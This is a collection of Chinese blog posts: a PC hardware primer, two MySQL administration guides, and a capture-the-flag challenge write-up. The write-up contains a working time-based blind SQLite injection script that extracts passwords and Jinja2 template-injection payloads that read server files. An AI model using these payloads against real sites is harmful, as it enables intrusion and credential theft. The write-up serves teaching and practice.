[{"categories":["Code"],"content":"计算机硬件知识科普 一篇简单的计算机硬件科普文，将简单从计算机各个硬件组成来普及个人pc以及简单服务器pc的硬件组成及品牌硬件参数知识。如有纰漏还望指正。出于本文的目的，是为了向小白快速普及计算机硬件知识，所以涉及偏向学术性质的原理知识这里可能会简单一笔带过。\n计算机的理论组成 现代计算机的结构组成脱胎于“冯 诺依曼结构”，也称为（所以冯诺依曼也被称为计算机之父），该理论计算机由如下四个部分组成：\n运算器\n运算器这里映射到现代计算机设备就是我们常规意义上的处理器（CPU）中负责数据运算的部分\n控制器\n控制器在现代计算机设备中被集成在处理器（CPU）中，简单讲其功能是负责指挥，控制指令的执行。\n存储器\n存储设备顾名思义，负责数据的存储，泛指各类存储，缓存等等。我们可以把电脑内存，硬盘等归类为存储器\n输入设备\n输入设备，是人与计算机交互的设备，在早期计算机中人们采用打孔纸带的方式与计算机交互。在现代计算机中，鼠标键盘，触摸屏（触摸这个特性），以及未来可能出现的脑机接口等都可以归类为输入设备。\n输出设备\n输出设备这里常规包括最基础的显示器。当然打印机等也可以算作输出设备。\n现代计算机硬件组成 讨论完理论性质上的组成，这一篇将描述实质上现代计算机中常规的硬件组成。这里我们排除各类输入输入设备，例如显示器，鼠标键盘等外部设备，将目光聚焦到主机本身上。\n一个主机基本上包括如下配件\n主板（Motherboard/Mainboard）\n主板的主要功能是提供一系列的结合点，形成一个能够集成处理器，内存，存储设备，显卡啊声卡，网卡等等和外部设备连接的平台，其他接下来的设备通过特定接口连接到主板。\n中央处理器(CPU, Central Processing Unit)\n计算机的大脑，负责运算处理数据\n内存（Memory）\n内存本质上也是存储器的一种，用于存储信息，但是内存是断电后数据就会丢失的。内存的出现是因为处理器速度很快，硬盘的读取速度又太低，于是需要内存作为缓存，内存先将需要的数据从硬盘读取好，方便cpu随时索取。\n显卡（GPU，Graphics Processing Unit）\n显卡可以理解为专门处理图形化信息的CPU,其负责图形信息的运算处理，并将其提供给显示设备显示。\n硬盘（HD,Hard Disk)\n硬盘，有一个存储器，其和内存的区别即在于断电后数据依旧可以存在，是计算机中存储数据最常见的方式。\n电源\n顾名思义，提供计算机运行所需要的电源\n散热器\n这里散热器将各类CPU散热器，机箱风扇，亦或是各类水冷归类到一起。为了保证运行中的高温设备有效散热，保障系统稳定运行。\n各类硬件详解 本章节将会介绍各个硬件设备的基础品牌，参数，型号等等知识点。先从篇幅较大且直接影响性能的CPU,GPU开始。\n中央处理器（CPU） 中央处理器，又叫中央处理单元，（CPU, Central Processing Unit）。常用的电脑处理器均来自两家厂商：Intel（英特尔），AMD。当然中国也有自己的自研处理器龙芯，不过这里不多介绍。\nIntel是目前唯一同时具有处理器设计制造一条流水线的厂商，其具备研发，设计，制造，拥有自己的晶圆厂商。\nAMD则是自己研发设计，将制造工作交给了台积电之类的企业。\n处理器常见参数名词详解 核心数目 指的是处理器所拥有的处理器核心数目，现有处理器一般为多核心的设计（多核心的设计实现了任务的并行处理）一般核心数目为1,2,4,8等二的几次方的数量。值得一提的是在intel 12代及后来版本的处理器中引入了大小核心的概念，即一个处理器有几个强力核心（P-core,Performance-cores）和几个能效核心(E-core,Efficient-cores)，大核负责干累活，小核负责打杂。\n线程数目 线程是计算机软件在系统中的最小调度单元，一般一个核心对应一个线程。但是随着超线程技术的出现，使得一个核心可以拥有两个线程。\n在了解完核心数目和线程数目的概念后既可以理解，双核四线程，以及四核八线程的概念了，即指一个处理器拥有两个处理核心，四个线程。\n这里再补充一个知识点，在Intel的大小核心的架构下，默认能小核心不具备超线程技术，所以就会有类似10核12线程（2大核，8小核心）这种不符合二进制规律的设计。\n主频 主频又叫 CPU的时钟频率（CPU Clock Speed），默频，指的是处理器在一个时钟信号周期内完成很的操作次数。一定程度上能够反映CPU的处理能力强弱。不过只是一定程度上，cpu的运算速度还和架构制程有着很大的关系，即同样主频的新旧两款处理器性能并不一样。\n睿频（加速频率） 睿频是Intel公司研发的时钟频率自动加速技术，开启睿频时处理器将针对任务负载调整处理器频率，且将尝试提升处理器频率到一个超过默认频率的状态。因此Intel的处理器也就有了一个最大睿频的参数，即单一核心在特点定条件下能够达到的最大频率。AMD也有其对应的加速技术。\n缓存 之前说道内存与处理器和硬盘之间关系的时候提到，为了应对硬盘速度过低于是有了内存。但是哪怕是内存的速度相较于处理器还是太慢了，于是就有了CPU缓存，可以简单理解为集成在处理器中的比内存快很多的“内存”。一般针对处理器缓存只有一个简单的参数概念，那就是其大小。\n功耗 功耗即一款CPU以满载运行时所所需要的功率。以我们常规的瓦W为单位\nTDP热功耗 TDP热功耗，又叫“热量设计功耗”，指处理器在满载的情况下所释放的热量，是评判一个处理器发热量的指标。一般依据这个指标去给处理器选择合适的散热器。值得注意提的是TDP并不等于功耗，也没有直接的算术关系，其仅作为指导散热器选择的指标，简单讲TDP 65w的设备可能实际满载运行的真实功耗远高于65w。\n架构 处理器架构是CPU厂商给属于同一系列的CPU产品设立的一个规范，例如Intel的Tigerlake架构，AMD的zen架构。是设计处理器的一种工业模式，一般情况下我们消费者无需太过关注其架构的实现细节，只需要指导架构的新旧，新的架构往往意味着更好性能和支持。\n指令集 指令集架构，是CPU中用来计算和控制计算机的一套指令集合，是一种标准。市面上常见的指令集架构如下：\nx86 ARM RISC ... 常规个人电脑或者服务器一般多用x86架构（intel与AMD生产的处理器也大多采用这个架构），ARM架构则多为移动设备采用，例如手机，平板的电脑等，知名的生产厂商例如：苹果的A系列芯片，M系列，以及高通骁龙系列。RISC则是高性能CPU的例如超算发展方向。\n32位/64位 32位和64位，本质上是计算机操作系统的所支持的存储器地址范围，通俗的讲，32位的系统仅仅支持4GiB（实际约为3.8G）的内存大小。而64位理论上支持16EB（17179869184GB）的内存。实际目前操作系统支持的内存大小还停留在TB（1024G）层次。\n简单总结，超过4G内存的电脑设备推荐使用64位的操作系统，同样也要支持64位的CPU才可以安装64位的操作系统。不过目前市面上多数的CPU都是支持64位系统的。\n超频 超频是一个不仅仅属于CPU的概念。之前提到CPU有主频， 有睿频，但无论哪都是厂商经过测试规定好的。而超频指的是用户拿到处理器，通过修改供电参数，修改核心参数等手段时使得处理器运行在一个超过厂商设定的频率的行为。当然超频行为不仅仅局限于处理器，凡是拥有频率参数的设备都可以通过超频这一手段获取额外的性能（其他有频率参数的设备例如：内存，显卡等）。当然超频本身对硬件可能会带来损伤，具有潜在风险。\n制程 制程指的是处理器在制造过程中所使用的”制作工艺“，用来衡量集成电路的制作精细度，一般以纳米nm为单位。可以理解为在硅片上雕刻的刻刀的大小，刻刀越小，单位面积内所能雕刻的电路也就越多，处理器性能也就越强悍。同时也会带来功耗减小的提升。\n但是现有厂商也很鸡贼开始不再使用nm为单位，而是转而给自己的刻刀起一个新的名字，例如intel在12代处理器后就将所采用的10nm工艺称为intel 7工艺，而将7nm工艺称为intel 4。这本质上只是文字游戏。\n当然哪怕相同的10nm工艺，不同晶圆厂商制造出来的集成电路密度也不一致。同时制成有和处理器架构名称有一定关联，即部分架构可能采取的是一种制程，而新架构采取的是更加优秀的制程。\n核显 核心显卡，又叫核显，集成显卡。区别于独立显卡，ta直接被封装在处理器中，拥有核显的CPU可以不需要安装独立显卡即可连接显示设备输出画面。\n主板插槽/芯片组 不论是AMD还是Intel生产的CPU，不同代的cpu所使用到的cpu主板插槽是不同的，同时因为cpu代数的不同还带来的主板芯片组的不同。常见的intel插槽有例如LGA系列插槽，和amd的AM系列插槽。同时插槽本身也有版本对应不同的代的处理器。例如LGA 1700对应酷睿12代的处理器，其支持这一插槽的主板芯片组有高端的Z690芯片组，中端的B660芯片组，低端的H610芯片组。\nIntel 处理器命名规则 消费级即指面向普通个人用户的产品。企业级即指产品面向企业用户，多用于服务器领域。\nIntel将处理器分为如下几个系列：奔腾系列，赛扬系列，酷睿系列，至强系列，凌动系列。这里只介绍消费级最常见的酷睿系列，以及简单介绍企业级的至强系列的命名规则。但除开命名规则，在你了解各种参数背后的意义后都可以前去intel官网查看每款处理器的参数从而了解处理器的性能。\n酷睿系列 酷睿分为i3,i5,i7,i9四个产品。以“intel Core i9-12900k”为例，\nintel指的是厂商 Core指的是酷睿系列 i9指的是产品名 12900k指的是型号，其中包括版本（代）数，和具体型号等参数 12代表十二代处理器 900代表具体型号，一般越高代表主频越高，核心数越多，性能越强。 字母后缀则表示附加特性，例如K表示处理器可超频，下标为常见字母后缀含义 后缀 含义 B 这一后缀为一体机采用,cpu多数直接采用封装工艺焊接在主板上，例如i5-8500B C 这一后缀只在5代CPU上出现过，代表该CPU拥有当时最强核显，例如i7-5775C G 带G后传系列为Kaby Lake 架构的处理器，为intel和amd合作产品，CPU由intel负责，核显则由amd提供，例如：i7-8809G H 在八代以前，H代表bga焊接封装（类似笔记本电脑cpu焊接在主板上无法更换），八代开始H不仅仅意味着bga封装，也意味着6核心（Hexagon），同时不具备超线程工艺，例如i3-8100H HK 这类产品在上面的H后缀处理器中加上了可超频属性，即笔记本设备处理器可超频，例如：i9-8950HK HQ 四代CPU中出现过的后缀，例如i7 4700HQ K 代表可超频 M 代表双核移动版（笔记本设备）处理器，四代后很少采用，例如i5-4310M R 和B类似的移动版（笔记本设备）处理器，例如i7-5775R T 低压桌面处理器（台式机设备），功耗和性能都低于不带后缀的版本，多用于一体机，工控设备等，例如i7-8700T U 低压版移动处理器，被用在各类超薄本，轻薄本上，例如i7-8550U X/XE 最高性能版本，例如i9-10980XE Y 比M后缀还早的处理器产品，超低压移动处理器，后续被M替代，例如i3-3229Y F 指不带核显的版本,需要安装独立显卡 至强系列 相较于消费级的处理器，至强系列主要服务于服务器领域，因而其主频参数相较而言更低，但是其核心数目要更多。目前intel将至强系列分为：Platinum铂金，Gold金牌，Silver银牌，Bronze铜牌。过去intel将至强系列分为E7,E5,E3。\n至强系列现阶段采用四位数字型号。\n第一位数字代表处理器级别： 数字 级别 9/8 铂金 6/5 黄金 4 银 3 铜 第二位代表处理器代次 第三位和第四位布局为特定功能，一般而言越强的处理器第三第四位越大 AMD 处理器命名规则 AMD的产品同样分为消费级的锐龙（Ryzen）系列，和服务器的EPYC系列。\n锐龙系列Ryzen 以AMD Ryzen 7 5700X为例：\nAMD代表厂商AMD Ryzen7 代表产品系列r7，锐龙有r3,r5,r7,r9四个系列，性能逐级递升。 5700X代表产品代数和型号等信息 第一位5表示产品代数，第五代 第二到第四位则是编号越大性能越强 字母后缀X表示可超频，支持AMD官方的XFR技术。AMD的字母后缀含义如下表 后缀 含义 X 支持超频即支持AMD官方的XFR超频技术 G 代表具有核心显卡 3D 代表具有3D缓存技术（一种使得处理器具有更大缓存的技术，可以显著提升处理器能力） WX 代表最新的超多线程系列，即AMD的线程撕裂者系列 PRO 支持一些特别的数据安全技术 U 移动端面向笔记本轻薄本的CPU,有较低功耗以及具有核显 H 标准电压的移动端处理器，相较于U系列性能更强，且同样具有核显 AMD EPYC系列 以AMD EPYC 7443P为例\nEPYC 产品系列 7443P产品型号等参数 第一位7代表7000系列 第二位则与核心数有关 数字 核心数目 0 8 1 16 2 24 3 32 4 48 5 64 6 84-96 第三位代表性能相关，数字越大核心性能越高。 第四位代表版本，可以是1,2,3,4 字母后缀P代表单插槽，即一个主板只可以安装一个处理器，F则表示更高性能。 显卡（GPU） 这里的显卡我们仅讨论独立显卡，即不包括之前有关核心显卡的相关内容。不过多数参数名词二者是通用的。\n目前世界上独立显卡的制造商有英伟达（Nvidia），AMD,英特尔（Intel），以及国内的摩尔线程。但由于Intel以及摩尔线程的独立显卡刚刚起步，因此这里不做讨论。\n常见显卡参数名词详解 显卡核心 显卡核心，即显卡芯片，因为厂商的不同芯片实际可能也不同。其内部结构以及性能也差距很大。一般我们通过显卡天梯图来判断核心强弱。显卡核心可以理解为一个近似CPU的存在，不过其被设计为更多的为了处理图形数据。\n显卡核心同样有着自己的架构，制程，代号名称，这些更加细节的参数需要根据具体型号前往对应官网查询。\n显卡的性能受到显卡核心型号，核心频率，显存大小，显存频率，显存位宽多方面制约。\n核心频率 核心频率，即显卡核心的工作频率，一定程度上可以反应核心的性能。 显卡核心也具有频率，也可以实现超频。\n显存 显存，顾名思义，显卡所用到内存。显存容量决定显卡能够临时存储数据的能力，一般而言越大越好。\n显存类型 显存可按照其制造工艺名称分为GDDR3,GDDR4，GDDR5,GDDR6,GDDR6X...等等，数字代表的是版本代数，X代表加强。另外，核心显卡也具有显存，不过核心显卡的显存是直接共享的电脑内存。当然独立显卡也会使用一部分电脑内存作为显存，不过使用电脑内存作为显存的方式终究比不过专业显存。\n显存频率 显存的工作频率，同时显存也可以超频。\n显存位宽 可以把显存位宽比作高速公路的路宽，显存只是一个存储数据的仓库，频率代表其单位时间内数据可以处理进出仓库速度，但是真正要把数据送进来和送出去则依靠显存位宽，也就是道路的宽度。所以容量和频率在大，但是位宽不够也会导致性能较低。\n显卡接口（视频给输出口） 显卡接口即显卡视频输出口，连接显示器等输出设备的接口类型。注意，并不是所有显卡都有视频输出口，部分专业计算卡因为只需要负责计算，并没有输出视频的需求所以在设计制造的时候并不会留有视频输出口。\n常见的显卡视频输出口有，较老的DVI,VGA,以及目前主流标准的HDMI,DP以及未来可能会流行的type c口。同时由于输出口的不同，其所采取的软件协议也有可能不同，例如HDMI口有专门的HDMI协议，包括HDMI1.0,2.0等。同样DP也有的对应的DP协议，包括DP1.2,DP1.4等。\n显卡插槽及协议 显卡与主板连接的插槽目前主流是PCI-E插槽，插槽的长度有直接决定传输位宽，一般显卡使用的是PCI-E x16的规格。同时显卡插槽采用的协议是PCIE协议，目前最新的协议是PCIE5.0，多数显卡目前使用得到的是PCIE4.0。\n显卡上的PCI-E插口又被称为金手指，即金色的引脚部分\n外接供电 PCI-E插槽本身是可以提供供电的，但由于高性能显卡高功耗，所以一般独立显卡会采用外接供电的形式（也有不需要外接供电的低功耗显卡）。\n供电规格\n外接供电一般有4pin,6pin,8pin这几种基础规格，最直观的就是看插孔数量。当然也有将不同规格pin的供电组合起来的形式，例如高端显卡会采用3x8pin的供电，即三个8pin供电，合计24pin供电。此外也有4+6pin供电的组合，或者双8pin,双6pin的组合。\n另外，英伟达在其最新的40系列显卡中引入了ATX3.0的供电标准，其有全新设计的16pin供电接口（不同于上面所说的双8pin的16pin供电）。\n供电接口朝向\n显卡供电接口目前有两种朝向，一种是尾插，常见于各类涡轮显卡（多用于服务器的显卡，为了方便供电线材排布以及散热排布，同时尾部插口也牺牲了视频输出口），另一种是常规的侧面插插口，位于显卡pci-e插口的对面。\n显卡厚度 显卡厚度已PCI-E插槽槽口计算，占用一个槽宽及单槽卡，两个为双槽卡，此外还有三槽卡,例如下图。可以看得到明显的右侧三个突出。\n涡轮卡 涡轮卡，又称作涡扇卡，区别于常规显卡的单风扇，双风扇，亦或是三风扇的设计，涡轮卡采用了具有涡轮增压效果的风扇以实现更好的散热更加优异的性能，同时更加小巧的体积（一般涡轮风扇等等显卡多为双槽的宽度，可以更加方便密集排布安装）。但是同时也带来了高噪音的缺点。因此一般涡轮风扇卡更多的被使用服务器上。\n公版/非公/oem版 公版显卡：指的是显卡设计公司例如AMD,或者NVIDIA,自己制造生产出来的显卡，被称之为公版，其具有标准的性能以及较为具有辨识度的外观。 非公版显卡：指的是显卡设计公司将显卡核心卖给第三方合作厂商例如华硕，微星等，这些第三方合作厂商自己设计外观散热供电生产出来的显卡即为非公版显卡。非公版显卡区别于公版可能会有更加好的散热及供电，以及相较于公版更高的核心频率以及显存频率。 oem版本显卡：这类显卡指的是一些电脑生产商例如联想，戴尔，他们会采购显卡核心制造一些用于自己成品的电脑的显卡。一般这类显卡是不对外零售的，不过不排除有流出的零星产品或者是拆机硬件在市场上。 NVIDIA英伟达显卡 英伟达显卡，其性能以及在很多领域方面的发展更为全面，除去常规的游戏，及视频工作，其在工业设计游戏制作，CG渲染，深度学习方面有着诸多建树。\nCUDA CUDA（Compute Unified Device Architecture, 统一计算设备架构）是英伟达厂商推出的计算机平台和变成模型，其利用GPU的算力帮助解决复杂的计算问题，多用于深度学习等领域。\n但不是所有设备都支持CUDA,一般旗舰级别的显卡，例如Geforce系列或者计算卡都是支持的。\n在深度学习，机器学习相关方面，还有几个重要名词：Tensorflow, Pytorch等，它们是一套深度学习框架，其可利用NVIDIA GPU的CUDA做到加速深度学习的。\n对应的AMD也在积极研发类似CUDA的技术，但由于起步较晚，尚未成熟以及市场占有率的问题，成熟运用尚早。\nDLSS DLSS(Deep Learning Super Sampling，深度学习超级采样)是一种NVIDIA研发的视频渲染技术，其使用神经网络提升画面流畅度。通俗的讲即通过牺牲一定程度的画面分辨率（清晰度）来提升画面流畅度（fps,帧率）。\n这一技术主要运用在个人电脑的游戏领域，目前DLSS(大力水手)有1.0,2.0,3.0三个版本，RTX20,30系列显卡支持DLSS2.0,DLSS3.0目前仅在40系列得到支持。\n同样的技术AMD FSR也在积极研发，不过相较于DLSS依旧是起步较晚，不过AMD 的FSR的技术不拘泥于硬件，这是其相较于NVIDIA的一个有时。\nG-Sync/FreeSync 自适应帧率同步技术，针对显示器的用于减少由于帧速率未对齐而导致的画面撕裂与延迟问题。\nFreeSync有AMD开发，随后Nvidia开发了其的对应的G-Sync。这一功能需要显卡以及显示器二者同时支持，且对视频输出口以及采用协议有关，目前多数仅支持DP接口DP协议。\n","description":"","subtitle":"科普常规PC硬件知识","tags":["硬件知识"],"title":"计算机硬件知识科普","uri":"/posts/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A1%AC%E4%BB%B6%E7%9F%A5%E8%AF%86%E5%B0%8F%E7%99%BD%E5%90%91/"},{"categories":["Code"],"content":"前言 无力吐槽的信安国赛，段子乎喷了上届比赛有多坑，感觉这届也不差啊？ 算了，我知道是我太菜。 本博客记录了一篇2019信安国赛复赛本队出题的一些经历。包括题目思路，搭建方法，以及writeup。 尽管我们没有最后参加复赛，但是也发现出题是一个很好的锻炼方式。 MORE 题目名称：不仅仅是个SQL 出题人：CC from nothing POINTS 基于SQLITE数据库的盲注 基于jinja2模板注入漏洞的任意代码执行漏洞 WRITEUP 打开网站首先看到的是一个登陆界面 照例查看一下网站的robots.txt看一下有没有什么可以发现的。 robots.txt中是网站登陆认证逻辑的源码，可以看出后算是使用python编写，数据库为sqlite。并对用户输入进行了过滤。 输入常用payload发现没有任何回显，所以这里需要盲注 sqlite3数据库的盲注是采用randomblob()函数 randomblob()函数生成指定长度的随机字符串。当这个长度足够大的时候就会让服务器产生明显的延迟。这样就可以判断语句的执行成功与否。 经过多次尝试发现后端过滤了小写的select，from等关键词。于是采用如图所示的方式注入 我们编写了如下脚本来注入获取密码 def sqlpw(url): session=requests.Session() params={\"password\":\"0\"} password=\"\" for i in range(32): for x in \"0123456789abcdefghijklmnopqrstuvwsyz\": try: username=\"admin'AND(SELECT(hex(substr(password,{},1)))FROM(users))=hex('{}')AND(randomblob(1000000000))--\".format(i+1,x) params['username']=username # print(params) r=session.post(url,data=params,timeout=1) # print(r.status_code) except exceptions.Timeout: password=password+x logging.info(password) sleep(3) break return password 运行脚本之后我们就获取到了密码的md5值，利用网上很多的md5查询库便可以得到密码原文 使用用户名密码登陆成功之后出现如上的欢迎界面。检查网页源码发现flag位于根目录下 这里的鸟居图片既是另一个提示。jinja2项目的LOGO 从URL传入参数username入手写入测试payload验证漏洞存在 经过测试发现注入点过滤方括号，于是构成如图所示payload完成注入获得flag Jinja2模板注入漏洞 Jinja2漏洞最早出现在py2的版本上。 漏洞原理基本就是传入的url中如果包含python脚本也是会被模板解析的。因为模板能够访问python内置变量以及变量方法。 注意python2和python3存在差别在类层结构上存在差别 __class__ 返回调用参数类型 __base__ 返回基类 __mro__ 允许我们在当前Python环境下追溯继承树 __subclasses__() 返回子类 获取基类\n首先通过str，dict，tuple，list等类型来获取python的基本类（因为python万物皆对象）你也可以通过一些其它jinja2已经导入的包来获取基类\npython3: ''.__class__.__base__ [].__class__.__base__ requests.__class__.__base__ python2: ''.__class__.__mro__[2] [].__class__.__base__ requets.__class__.__mro__[8] 获取基类的方法可以在python命令行中输入尝试\n如果题目对中括号做了限制，也可以通过__getitem__(2)函数绕过限制\n读取文件\n以下基类通过object代替\npython2： object.__subclasses__()[40]('/etc/password ').read() //获取file类读文件 python3中要复杂的多，首先是python3的类层结构和python2下相比会复杂的多。其次python3的类必须经过初始化等等操作才可以使用其内建函数\npython3: object.__subclasses__()[78].__init__.__globals__.__builtins__.open(\"./flag.txt\",encoding=\"utf-8\").read() python3中我们获取子类列表之后随便选择一个类，查看其__init__\n\u003cslot wrapper '__init__' of 'object' objects\u003e wrapper是指这些函数没有被重载。这是他们并不是function，并不具有___globals__属性。我们在多尝试几个子类就可以找到一个被__init__的类，比如。接下来就可以使用内置函数执行命令。\n以上都只是最基础的操作，jinja2模板注入还有很多其他操作需要更多的尝试理解才可以完成。\n后记 这次比赛真是一个很不愉快的体验。这个题目出题到写博客也隔了很久。所以有些细节在本博客中可能描述的很不清楚。（总之这篇博客很垃圾就是了）在图书馆办公室一边修理爬虫一边跑着爬虫利用闲暇之余写出来的博客真的质量不高令人堪忧。总之就这样吧，感谢阅读。 ","description":"","tags":["Python","数据库"],"title":"2019信安国赛出题经历","uri":"/posts/2019%E4%BF%A1%E5%AE%89%E5%9B%BD%E8%B5%9B%E5%87%BA%E9%A2%98%E7%BB%8F%E5%8E%86/"},{"categories":["Code"],"content":"摘要 很多同学在学习数据库操作的过程中，总会因为某些莫名奇妙的原因导致数据库密码变动，而到了不得不重置数据库密码的情况。本文主要讲解一下各个版本的MYSQL数据库重置密码的方法。 如何查看MYSQL版本 打开一个命令行，在命令行里输入如下指令（如果你的MYSQL配置了环境变量的话）\nmysql --version 如果你的MYSQL没有配置环境变量，你可以去到mysql的安装目录下的bin文件夹里，运行上述命令。\n如果你不知道如何改变命令行目录，可以用打开文件管理器，进入到mysql的安装目录下的bin文件夹内然后按住shift再点击鼠标右键。\n这时你可以看到右键菜单里有个“在此处打开powershell窗口”（或者也可能时在此处打开cmd窗口一类的）\n如果你连这些都不会，如果你不知道什么是环境变量。emmmmmm这个教程大概不适合你.\n以上均基于Microsoft Windows 10系统\nMYSQL 5.5+ 首先开启一个具有管理员权限的命令行，在其中输入如下指令关闭mysql服务\nnet stop mysql 接下来进入到mysql的安装文件夹下的bin目录内（如果你配置了环境变量也可以直接在命令行里运行）\nmysqld -nt --skip-grant-tables 如果你发现命令行运行的“卡住了”，那么恭喜你可以成功进入下一步\n--skip-grant-tables 你可以简单的理解为跳过密码认证\n接下来保证这个命令行界面开启状态，重新打开一个新的命令行窗口。运行如下命令\nmysql -u root -p 出现提示输入密码直接按回车即可，你会发现你已经成功给进入到了数据库内部\n然后使用数据库命令重置密码即可\nuse mysql; -- 切换到mysql数据库 update user set password=password(\"123456\") where user=\"root\"; --修改密码为123456 以上命令也可以用于你知道密码的情况下想要修改密码。 不过在正常情况下执行完上述命令之后需要再增加如下命令刷新权限才可以让数据库密码更新成功（当然这里不需要）\nflush privileges; 当修改命令执行成功后。输入exit退出数据库。关闭这个新的命令行，回到我们一开始启动的命令行。使用ctrl+c中止命令。然后使用如下命令重启mysql服务\nnet start mysql 如果不出意外，服务启动成功，那么你的密码重置就完成了。\nMYSQL 8.0+ MYSQL 8下有两种方法可以重置密码 使用--init-file 首先依旧是打开一个具有管理员权限的命令行，使用命令停止mysql服务\nnet stop mysql 接下来创建一个文本文件（sql.txt），指定在启动时需要执行的修改密码的命令。\nALTER USER \"root\"@\"localhost\" IDENTIFIED BY \"123456\"; 将密码重置为123456\n最后使用如下命令启动\nmysqld --init-file=E:/sql.txt --console 启动成功之后重新开启一个新的命令行，尝试使用重置的密码（123456）登陆数据库吧。如果没有重置成功，请检查sql.txt中的sql语句语法是否出现问题。\n当你使用重置的密码登陆成功之后，关闭掉新的命令行界面，回到旧的命令行界面使用ctrl+c中止命令。最后再重新启动mysql服务\nnet start mysql 使用--skip-grant-tables 开启一个具有管理员权限的命令行，先关闭mysql服务\nnet stop mysql 使用如下命令无密码启动服务\nmysqld --console --skip-grant-tables --shared-memory 这就是mysql5与mysql8的差别，mysql8想要使用skip-grant启动必须加入额外参数，否则服务无法启动\n接下来重新开启一个命令行以空密码登陆数据库\nmysql -u root -p 提示输入密码直接按下回车即可。接下来重置密码\nupdate mysql.user set authenication_string=\"123456\" where user=\"root\" and host=\"localhost\"; 执行成功无错误之后即表示密码重置成功\n接下来退出数据库，关闭新的命令行，回到之前的命令行使用ctrl+c中止命令，然后重新启动mysql服务\nnet start mysql ","description":"","tags":["数据库"],"title":"MYSQL密码重置详解","uri":"/posts/mysql%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E8%AF%A6%E8%A7%A3/"},{"categories":["Code"],"content":"摘要 记录关于MySQL从csv文件导入数据的一些采坑记录 什么是csv文件 csv文件本质只是一个文本文件，它与你所见过的txt文件别无差异。（对，除了excel，你还可以用txt打开这类文件） csv文件（Comma-Separated Values）逗号分隔值文件格式，其文件以纯文本形式存储表格数据，并且以逗号分隔。 怎样将数据从csv导入到mysql 如果你看到如下报错 The MySQL server is running with the --secure-file-priv option so it cannot execute... 首先部分Mysql server设置中不允许你从任意路径导入数据\n解决这点，你只需要在mysql server的安装路径下修改my.ini文件，并在其中修改如下内容（划重点，安装路径！！！安装路径里必定存在bin这类似文件夹）如果你有这个文件就找到对应的地方修改，如果没有就添加（注意开头不要有井号）\n修改文件最好备份my.ini因为如果这个文件内容错误mysql将无法启动\n[mysqld] secure-file-priv=\"D:/CoderLife/testMySQL\" # 这个路径你自己可以自定义 如果你的mysql安装目录下不存在这个文件，你可以尝试去C:/Program Data/MySQL/MySQL Server类似路径下寻找（Program Data文件夹是一个隐藏文件夹，请勾选显示隐藏文件以及文件夹） 如果还是无法找到可以使用搜索文件功能 如果完全没有这个文件(作者我帮忙配置mysql的那一部分人应该是完全没有这个文件的)，则在mysql server的安装路径下新建my.ini,内部基础内容如下 [mysqld] # 这里指定你想要设置的路径，必须保证这个路径存在 secure-file-priv=\"E:/test\" [mysql] default-character-set=utf8 [client] default-character-set=utf8 接下来重启mysql服务\n在具有管理员权限的命令行下输入如下命令\nnet stop mysql net start mysql 接下来进入数据库，输入如下命令\nshow variables like \"%secure%\" 如果出现的回显中包含你之前设置的路径，则表示路径修改成功过\n文件字符编码问题 要想成功导入文件，必须保证csv文件编码格式与数据库的编码格式相同。\nmysql是一个复杂的数据库，这里我们从默认编码开始修改。\n修改默认字符编码\n依旧是打开my.ini文件，修改文件内容（添加或者查找修改，依据你是创建的文件还是原来就有my.ini文件自行把握）\n修改如下三处（如果某个[xxx]标签下没有则添加）\n[client] default-character-set=utf8 [mysql] default-character-set=utf8 [mysqld] character-set-server=utf8 重启mysql服务\n具有管理员权限的命令行！ 具有管理员权限的命令行！ 具有管理员权限的命令行！\nnet stop mysql net start mysql 进入数据库查看是否修改成功\nmysql\u003e SHOW VARIABLES LIKE 'character%'; +--------------------------+---------------------------------------------------------+ | Variable_name | Value | +--------------------------+---------------------------------------------------------+ | character_set_client | utf8 | | character_set_connection | utf8 | | character_set_database | utf8 | | character_set_filesystem | binary | | character_set_results | utf8 | | character_set_server | utf8 | | character_set_system | utf8 | | character_sets_dir | C:\\Program Files\\MySQL\\MySQL Server 5.0\\share\\charsets\\ | +--------------------------+---------------------------------------------------------+ 8 rows in set 出现类似如上字样表示修改成功\n修改csv文件的编码为utf-8\n作者本人使用的是VScode转换的编码\n你也可以使用类似的其他编辑器修改(列如notepad++)\n从这里下载notepad++(如果你打不开就百度瞎几把找一个吧)\n使用notepad++打开csv文件,右下角就会标注这个文件的编码\n选择编码-\u003e选择转为UTF-8编码,最后保存退出即可 不建议使用txt修改，因为txt的UTF-8格式是带有BOM的，导入时依旧会报错\n导入命令问题 仅仅使用\nLOAD DATA INFILE \"file_name\" INTO TABLE tbl_name 是无法完成插入操作的，大概率会出现如下报错\nData truncated for column xxx at row 1 因为我们需要指定你准备导入的csv文件格式\n完整命令 LOAD DATA INFILE \"D:/CoderLife/testMySQL/test.csv\" -- 指定csv文件路径，路径必须是我们一开始设置的 INTO TABLE nation -- 指定你要插入的表格 FIELDS TERMINATED BY ',' -- 指定csv文件是以逗号为分隔符 ENCLOSED BY '\"' -- 指定文本以双引号闭合 LINES TERMINATED BY \"\\r\\n\"; -- 指定行按照如上格式换行 拓展补充 \\r 回车符 \\n 换行符 window环境下文本文件换行多数以“\\r\\n”为换行符 Linux环境下的文本文件换行就是以“\\n” 有关这个导入命令的详解，可以移步这篇文章\n报错“ Duplicate entry for key ...” 这个报错是因为你之前的表内有数据导致了主键冲突，方法删除旧的表内的内容。\ndelete from table_name 报错“Row does not contain data for all columns” 这个报错是因为csv内的数据并没有包含表的所有键值，那么这就需要在我们导入数据的时候指定导入数据数据那几列 就是在之前上面的导入代码最后加上一个括号，里面按照csv数据列的顺序依次标注其键名\nLOAD DATA INFILE \"D:/CoderLife/testMySQL/test.csv\" -- 指定csv文件路径，路径必须是我们一开始设置的 INTO TABLE nation -- 指定你要插入的表格 FIELDS TERMINATED BY ',' -- 指定csv文件是以逗号为分隔符 ENCLOSED BY '\"' -- 指定文本以双引号闭合 LINES TERMINATED BY \"\\r\\n\" -- 指定行按照如上格式换行 (key1,key2,key3); -- 指定你需要导入的键 报错“ Incorrect integer value: xxx” 这个报错是因为csv文件第一行存在着表头数据，我们可以数用如下命令忽略第一行\nLOAD DATA INFILE \"D:/CoderLife/testMySQL/test.csv\" -- 指定csv文件路径，路径必须是我们一开始设置的 INTO TABLE nation -- 指定你要插入的表格 FIELDS TERMINATED BY ',' -- 指定csv文件是以逗号为分隔符 ENCLOSED BY '\"' -- 指定文本以双引号闭合 LINES TERMINATED BY \"\\r\\n\" -- 指定行按照如上格式换行 IGNORE 1 LINES -- 指定忽略第一行 (key1,key2,key3); -- 指定你需要导入的键 